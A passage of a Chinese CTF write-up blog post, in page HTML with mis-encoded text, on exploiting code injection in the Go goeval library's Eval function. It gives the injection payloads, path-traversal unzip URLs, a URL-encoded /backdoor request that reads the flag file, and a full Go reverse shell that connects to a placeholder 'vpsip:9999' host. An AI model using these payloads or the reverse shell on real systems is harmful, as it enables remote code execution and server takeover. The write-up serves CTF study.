                importStr += fmt.Sprintf(&quot;\n %s \&quot;%s\&quot;&quot;, item[:blankInd], item[blankInd+1:])
            &#125; else &#123;
                importStr += fmt.Sprintf(&quot;\n\&quot;%s\&quot;&quot;, item)
            &#125;
        &#125;
        importStr += &quot;\n)&quot;
    &#125;
    fullCode = fmt.Sprintf(tmp, importStr, defineCode, code)

    var codeBytes = []byte(fullCode)
    // æ ¼å¼åŒ–è¾“å‡ºçš„ä»£ç 
    if formatCode, err := format.Source(codeBytes); nil == err &#123;
        // æ ¼å¼åŒ–å¤±è´¥ï¼Œå°±è¿˜æ˜¯ç”¨ content å§
        codeBytes = formatCode
    &#125;

    // åˆ›å»ºç›®å½•
    if err = os.Mkdir(newTmpDir, os.ModePerm); nil != err &#123;
        return
    &#125;
    defer os.RemoveAll(newTmpDir)
    // åˆ›å»ºæ–‡ä»¶
    tmpFile, err := os.Create(newTmpDir + dirSeparator + &quot;main.go&quot;)
    if err != nil &#123;
        return re, err
    &#125;
    defer os.Remove(tmpFile.Name())
    // ä»£ç å†™å…¥æ–‡ä»¶
    tmpFile.Write(codeBytes)
    tmpFile.Close()
    // è¿è¡Œä»£ç 
    cmd := exec.Command(&quot;go&quot;, &quot;run&quot;, tmpFile.Name())
    res, err := cmd.CombinedOutput()
    return res, err
&#125;
</code></pre>
<p>å¯ä»¥çœ‹å‡ºæ¥ï¼ŒEvalæ˜¯å°†ä»£ç å†™å…¥ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ç„¶åè¿è¡Œå†è¿”å›è¿è¡Œçš„ç»“æœï¼Œè€Œä¸”æ˜¯ä»¥æ‹¼æ¥çš„æ–¹å¼æ¥å†™å…¥ä»£ç </p>
<p>æ‰€ä»¥å¯ä»¥è¿›è¡Œä»£ç æ³¨å…¥ï¼Œç”¨<code>\t</code>æ›¿ä»£ç©ºæ ¼ï¼ŒåŒæ—¶ç”±äºä»–æ‰§è¡Œçš„æ˜¯mainå†…çš„ä»£ç ï¼Œè€Œä¸”è¿™ä¸ªæ˜¯å†™æ­»çš„ï¼Œæ‰€ä»¥å¾—å°†è¦æ‰§è¡Œçš„ä»£ç å†™å…¥init()é‡Œï¼Œè¿™ä¸ªå‡½æ•°ä¼šåœ¨main()å‰æ‰§è¡Œï¼Œç„¶åä½¿ç”¨varæ¥é—­åˆæœ€åé¢çš„<code>&quot;)</code></p>
<p>initå‡½æ•°ç‰¹æ€§</p>
<blockquote>
<p>1.initå‡½æ•°å¯ä»¥åœ¨æ‰€æœ‰ç¨‹åºæ‰§è¡Œå¼€å§‹å‰è¢«è°ƒç”¨ï¼Œå¹¶ä¸”æ¯ä¸ªåŒ…ä¸‹å¯ä»¥æœ‰å¤šä¸ªinitå‡½æ•°<br>2.initå‡½æ•°å…ˆäºmainå‡½æ•°è‡ªåŠ¨æ‰§è¡Œ<br>3.æ¯ä¸ªåŒ…ä¸­å¯ä»¥æœ‰å¤šä¸ªinitå‡½æ•°ï¼Œæ¯ä¸ªåŒ…ä¸­çš„æºæ–‡ä»¶ä¸­ä¹Ÿå¯ä»¥æœ‰å¤šä¸ªinitå‡½æ•°<br>4.initå‡½æ•°æ²¡æœ‰è¾“å…¥å‚æ•°ã€è¿”å›å€¼ï¼Œä¹Ÿæœªå£°æ˜ï¼Œæ‰€ä»¥æ— æ³•å¼•ç”¨<br>5.ä¸åŒåŒ…çš„initå‡½æ•°æŒ‰ç…§åŒ…å¯¼å…¥çš„ä¾èµ–å…³ç³»å†³å®šæ‰§è¡Œé¡ºåº<br>6.æ— è®ºåŒ…è¢«å¯¼å…¥å¤šå°‘æ¬¡ï¼Œinitå‡½æ•°åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯åªæ‰§è¡Œä¸€æ¬¡<br>7.initå‡½æ•°åœ¨ä»£ç ä¸­ä¸èƒ½è¢«æ˜¾ç¤ºçš„è°ƒç”¨ï¼Œä¸èƒ½è¢«å¼•ç”¨ï¼ˆèµ‹å€¼ç»™å‡½æ•°å˜é‡ï¼‰ï¼Œå¦åˆ™ä¼šå‡ºç°ç¼–è¯‘é”™è¯¯<br>8.å¯¼å…¥åŒ…ä¸è¦å‡ºç°å¾ªç¯ä¾èµ–ï¼Œè¿™æ ·ä¼šå¯¼è‡´ç¨‹åºç¼–è¯‘å¤±è´¥<br>9.Goç¨‹åºä»…ä»…æƒ³è¦ç”¨ä¸€ä¸ªpackageçš„initæ‰§è¡Œï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·ä½¿ç”¨ï¼šimport _ â€œtest_xxxxâ€ï¼Œå¯¼å…¥åŒ…çš„æ—¶å€™åŠ ä¸Šä¸‹åˆ’çº¿å°±okäº†<br>10.åŒ…çº§åˆ«çš„å˜é‡åˆå§‹åŒ–ã€initå‡½æ•°æ‰§è¡Œï¼Œè¿™ä¸¤ä¸ªæ“ä½œéƒ½æ˜¯åœ¨åŒä¸€ä¸ªgoroutineä¸­è°ƒç”¨çš„ï¼ŒæŒ‰é¡ºåºè°ƒç”¨ï¼Œä¸€æ¬¡ä¸€ä¸ªåŒ…<br>11.initå‡½æ•°ä¸åº”è¯¥ä¾èµ–ä»»ä½•åœ¨mainå‡½æ•°é‡Œåˆ›å»ºçš„å˜é‡ï¼Œå› ä¸ºinitå‡½æ•°çš„æ‰§è¡Œæ˜¯åœ¨mainå‡½æ•°ä¹‹å‰çš„<br>12.åœ¨initå‡½æ•°ä¸­ä¹Ÿå¯ä»¥å¯åŠ¨goroutineï¼Œä¹Ÿå°±æ˜¯åœ¨åˆå§‹åŒ–çš„åŒæ—¶å¯åŠ¨æ–°çš„goroutineï¼Œè¿™å¹¶ä¸ä¼šå½±å“åˆå§‹åŒ–é¡ºåº<br>13.å¤æ‚é€»è¾‘ä¸å»ºè®®ä½¿ç”¨initå‡½æ•°ï¼Œä¼šå¢åŠ ä»£ç çš„å¤æ‚æ€§ï¼Œå¯è¯»æ€§ä¹Ÿä¼šä¸‹é™<br>14.ä¸€ä¸ªæºæ–‡ä»¶ä¸‹å¯ä»¥æœ‰å¤šä¸ªinitå‡½æ•°ï¼Œä»£ç æ¯”è¾ƒé•¿æ—¶å¯ä»¥è€ƒè™‘åˆ†å¤šä¸ªinitå‡½æ•°<br>15.ç¼–ç¨‹æ—¶ä¸è¦ä¾èµ–initçš„é¡ºåº</p>
</blockquote>
<pre><code class="go">pkg := &quot;os/exec\&quot;\n\&quot;fmt\&quot;\n)\n\nfunc\tinit()&#123;\ncmd:=exec.Command(\&quot;ls\&quot;)\nout,_:=cmd.CombinedOutput()\nfmt.Println(string(out))\n&#125;\nvar(\na=\&quot;1&quot;
goeval.Eval(&quot;&quot;, &quot;fmt.Println(\&quot;Good\&quot;)&quot;, pkg)
</code></pre>
<p>å°±ä¼šæ‰§è¡Œ</p>
<pre><code class="go">package main

import (
&quot;os/exec&quot;
&quot;fmt&quot;
)

func	init()&#123;
cmd:=exec.Command(&quot;ls&quot;)
out,_:=cmd.CombinedOutput()
fmt.Println(string(out))
&#125;
var(
a=&quot;1&quot;
)



func main() &#123;
fmt.Println(&quot;Good&quot;)
&#125;
</code></pre>
<h2 id="0x02-é¢˜è§£"><a href="#0x02-é¢˜è§£" class="headerlink" title="0x02 é¢˜è§£"></a>0x02 é¢˜è§£</h2><h3 id="æ–¹æ³•ä¸€-ä»£ç æ³¨å…¥"><a href="#æ–¹æ³•ä¸€-ä»£ç æ³¨å…¥" class="headerlink" title="æ–¹æ³•ä¸€ ä»£ç æ³¨å…¥"></a>æ–¹æ³•ä¸€ ä»£ç æ³¨å…¥</h3><p>å…ˆåœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªuser.gobæ–‡ä»¶ï¼Œå°±è·Ÿæºç é‡Œçš„æ–¹å¼ä¸€æ ·å»ºä¸€ä¸ªå†å‹ç¼©</p>
<p>ç„¶åä¸Šä¼ æ–‡ä»¶ï¼Œå†è§£å‹ç¼©æ–‡ä»¶</p>
<p>è§£å‹ç¼©çš„urlä¸º</p>
<pre><code class="bash">/unzip?path=../../../../tmp/49c69cef49dc4b3be71e988a20149ca7
</code></pre>
<p>ç„¶åè®¿é—®<code>/backdoor</code>è·¯ç”±ï¼Œè¿›è¡Œä»£ç æ³¨å…¥ï¼Œè¿œç¨‹æ‰§è¡Œå‘½ä»¤</p>
<p>payload</p>
<pre><code class="bash">/backdoor?pkg=os%2Fexec%22%0A%22fmt%22%0A%29%0A%0Afunc%09init%28%29%7B%0Acmd%3A%3Dexec.Command%28%22cat%22%2C%22%2Fffflllaaaggg%22%29%0Aout%2C_%3A%3Dcmd.CombinedOutput%28%29%0Afmt.Println%28string%28out%29%29%0A%7D%0Avar%28%0Aa%3D%221
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191641018.png" alt="image-20230219164136927"></p>
<h3 id="æ–¹æ³•äºŒ-ä½¿ç”¨åˆ«åæ‰§è¡Œè‡ªå·±çš„åŒ…"><a href="#æ–¹æ³•äºŒ-ä½¿ç”¨åˆ«åæ‰§è¡Œè‡ªå·±çš„åŒ…" class="headerlink" title="æ–¹æ³•äºŒ ä½¿ç”¨åˆ«åæ‰§è¡Œè‡ªå·±çš„åŒ…"></a>æ–¹æ³•äºŒ ä½¿ç”¨åˆ«åæ‰§è¡Œè‡ªå·±çš„åŒ…</h3><p>è¿™æ˜¯æˆ‘åœ¨å†™wpçš„æ—¶å€™å‘ç°çš„å¦ä¸€ä¸ªæ–¹æ³•</p>
<p>çœ‹ä¸€ä¸‹Evalå¯¹ç¬¬ä¸‰ä¸ªå‚æ•°çš„åŒºåˆ«å¤„ç†</p>
<pre><code class="go">for _, item := range imports &#123;
    if blankInd := strings.Index(item, &quot; &quot;); -1 &lt; blankInd &#123;
        importStr += fmt.Sprintf(&quot;\n %s \&quot;%s\&quot;&quot;, item[:blankInd], item[blankInd+1:])
    &#125; else &#123;
        importStr += fmt.Sprintf(&quot;\n\&quot;%s\&quot;&quot;, item)
    &#125;
&#125;
</code></pre>
<p>eg:</p>
<pre><code class="go">goeval.Eval(&quot;&quot;, &quot;fmt.Println(\&quot;Good\&quot;)&quot;, &quot;fmt os/exec&quot;)
</code></pre>
<p>å°±ä¼šå˜æˆ</p>
<pre><code class="go">package main

import (
 fmt &quot;os/exec&quot;
)



func main() &#123;
fmt.Println(&quot;Good&quot;)
&#125;
</code></pre>
<p>ç›¸å½“äºç»™å¯¼å…¥çš„åŒ…è®¾ç½®ä¸€ä¸ªåˆ«å,æ‰€ä»¥å¯ä»¥å°†æˆ‘ä»¬è‡ªå·±çš„åŒ…è®¾ç½®åˆ«åä¸ºfmtï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç </p>
<p>è‡ªå·±å»ºç«‹çš„åŒ…</p>
<p><code>PrintLn.go</code></p>
<pre><code class="go">package v2i

import (
    &quot;fmt&quot;
    &quot;os/exec&quot;
)
func Println(a string)&#123;
    _=a
    cmd:=exec.Command(&quot;ls&quot;, &quot;/&quot;)
    out,_:=cmd.CombinedOutput()
    fmt.Println(string(out))
&#125;
</code></pre>
<p>å°†æ–‡ä»¶å‹ç¼©ï¼Œç„¶åä¸Šä¼ ï¼Œè§£å‹åˆ°<code>/usr/local/go/src/v2i</code></p>
<p>è·¯å¾„åœ¨æŠ¥é”™é‡Œçœ‹åˆ°</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191647878.png" alt="image-20230219164700793"></p>
<pre><code class="bash">/unzip?path=../../../../usr/local/go/src/v2i
</code></pre>
<p>ç„¶ååœ¨<code>/backdoor</code>è·¯ç”±</p>
<pre><code class="bash">/backdoor?pkg=fmt v2i
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191648789.png" alt="image-20230219164845696"></p>
<p>è¿™æ ·å°±æ‰§è¡Œäº†æˆ‘ä»¬çš„ä»£ç ï¼Œä½†æ˜¯æœ‰ç‚¹éº»çƒ¦ï¼Œå¾—ä¸æ–­ä¸Šä¼ è§£å‹ç¼©</p>
<p>ä½†ä¹Ÿå¯ä»¥è¯•è¯•åå¼¹shellï¼Œå¦‚æœè¦åå¼¹shellçš„è¯ï¼Œè‡ªå·±å»ºçš„åŒ…å°±å¾—æ˜¯ã€ä»ç½‘ä¸ŠæŠ„çš„ä»£ç XDã€‘</p>
<pre><code class="go">package v2i
import (
    &quot;io&quot;
    &quot;net&quot;
    &quot;io/ioutil&quot;
    &quot;log&quot;
    &quot;os/exec&quot;
)

var (
    cmd string
    line string
)

func Println(a string) &#123;
    _=a
    addr := &quot;vpsip:9999&quot; //è¿œç¨‹è¿æ¥ä¸»æœºå
    conn,err := net.Dial(&quot;tcp&quot;,addr) //æ‹¨å·æ“ä½œï¼Œç”¨äºè¿æ¥æœåŠ¡ç«¯ï¼Œéœ€è¦æŒ‡å®šåè®®ã€‚
    if err != nil &#123;
        log.Fatal(err)
    &#125;

    buf := make([]byte,10240) //å®šä¹‰ä¸€ä¸ªåˆ‡ç‰‡çš„é•¿åº¦æ˜¯10240ã€‚
    for  &#123;
        n,err := conn.Read(buf) //æ¥å—çš„å‘½ä»¤
        if err != nil &amp;&amp; err != io.EOF &#123;  //io.EOFåœ¨ç½‘ç»œç¼–ç¨‹ä¸­è¡¨ç¤ºå¯¹ç«¯æŠŠé“¾æ¥å…³é—­äº†ã€‚
            log.Fatal(err)
        &#125;

        cmd_str := string(buf[:n])
        cmd := exec.Command(&quot;/bin/bash&quot;,&quot;-c&quot;,cmd_str) //å‘½ä»¤æ‰§è¡Œ
        stdout, err := cmd.StdoutPipe()
        if err != nil &#123;
            log.Fatal(err)
        &#125;
        defer stdout.Close()
        if err := cmd.Start(); err != nil &#123;
            log.Fatal(err)
        &#125;
        opBytes, err := ioutil.ReadAll(stdout)
        if err != nil &#123;
            log.Fatal(err)
        &#125;
        conn.Write([]byte(opBytes)) //è¿”å›æ‰§è¡Œç»“æœ
    &#125;
&#125;
</code></pre>
<p>ç„¶åç”¨ç›¸åŒçš„æ–¹å¼æ‰§è¡Œï¼Œå°±å¯ä»¥åœ¨vpsä¸Šè·å¾—shell</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191655597.png" alt="image-20230219165545537"></p>
<h2 id="0x03-å‚è€ƒæ–‡ç« "><a href="#0x03-å‚è€ƒæ–‡ç« " class="headerlink" title="0x03 å‚è€ƒæ–‡ç« "></a>0x03 å‚è€ƒæ–‡ç« </h2><ul>
<li><a target="_blank" rel="noopener" href="http://www.gem-love.com/2022/07/25/goeval%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#undefined">goevalä»£ç æ³¨å…¥å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ(2022è™ç¬¦Final)</a></li>
</ul>

    </div>

    <div class="post-meta">
        <i>
        
            <span>2023-07-03</span>
            
                <span>è¯¥ç¯‡æ–‡ç« è¢« v2ish1yan</span>
            
            
                <span>æ‰“ä¸Šæ ‡ç­¾:
                    
                    
                        <a href='/tags/nodejs/'>
                            nodejs
                        </a>
                    
                        <a href='/tags/php/'>
                            php
                        </a>
                    
                        <a href='/tags/CTF/'>
                            CTF
                        </a>
                    
                        <a href='/tags/go/'>
                            go
                        </a>
                    
                        <a href='/tags/rust/'>
                            rust
                        </a>
                    
                </span>
             
             
                <span>å½’ä¸ºåˆ†ç±»:
                    
                    
                        <a href='/categories/WP/'>
                            WP
                        </a>
                    
                </span>
            
        
        </i>
    </div>
    
        
    <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
         
    </div>
    
        

    <div id="waline"></div>
    <script type="module"  >
        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
        function loadWaline() {
            init({
                el: '#waline',
                serverURL: 'https://a4-talk.vercel.app',
                lang: 'zh-CN',
                dark: 'body[class~="dark-mode"]',
                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
                search: false, // ç¦æ­¢è¡¨æƒ…åŒ…æœç´¢
                reaction: false, // å¯¹æ–‡ç« æ‰“åˆ†
                pageview: false, // æµè§ˆé‡ç»Ÿè®¡
                comment: false, // è¯„è®ºæ•°ç»Ÿè®¡

                locale: {
                    placeholder: 'æ¬¢è¿è¯„è®º', 
                    sofa: ''
                },
            });
            
        }
        window.addEventListener('DOMContentLoaded', loadWaline);
    </script>



    
    
    
    </div>


     
</div>



                                      
                    
                    
                    <div class="footer">
    
        <span> 
            Â© 1949-2024 China 

            
                

            
        </span>
    
</div>
<!--è¿™æ˜¯æŒ‡ä¸€æ¡çº¿å¾€ä¸‹çš„å†…å®¹-->
<div class="footer-last">
    
            <span>ğŸŒŠé¢æœå¤§æµ·ï¼Œæ˜¥æš–èŠ±å¼€ğŸŒ¸</span>
            
                <span class="footer-last-span-right"><i>æœ¬ç«™ç”±<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>é©±åŠ¨ï½œä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>ä¸»é¢˜</i></span>
            
    
</div>


   
    
<script src="/js/highlight.min.js"></script>

    
<script src="/js/highlightjs-line-numbers.js"></script>


    
<script src="/js/randomHeaderContent.js"></script>

    <!--å›åˆ°é¡¶éƒ¨æŒ‰é’®-->
    
        
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>

        
<script src="/js/returnToTop.js"></script>

    

    <!--ç›®å½•-->
    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
        
<script src="/js/toc.js"></script>

    



<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>



                </div>
            
            
                <!-- å›åˆ°é¡¶éƒ¨çš„æŒ‰é’®-->  
                <div class="progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
    </body>


    <!--æš—é»‘æ¨¡å¼-->
    <script src="/js/darkmode-js.min.js"></script>
    <script>
        function addDarkmodeWidget() {
        const options = {
            bottom: '53px', // default: '32px'
            right: 'unset', // default: '32px'
            left: '42px', // default: 'unset'
            time: '0.3s', // default: '0.3s'
            mixColor: '#fff', // default: '#fff'
            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
            buttonColorDark: '#100f2c',  // default: '#100f2c'
            buttonColorLight: '#fff', // default: '#fff'
            saveInCookies: true, // default: true,
            label: 'ğŸŒ“', // default: ''
            autoMatchOsTheme: true // default: true
        }
    
        const darkmode = new Darkmode(options);
        darkmode.showWidget();
        
        }
        window.addEventListener('load', addDarkmodeWidget);
    </script>
  
</html>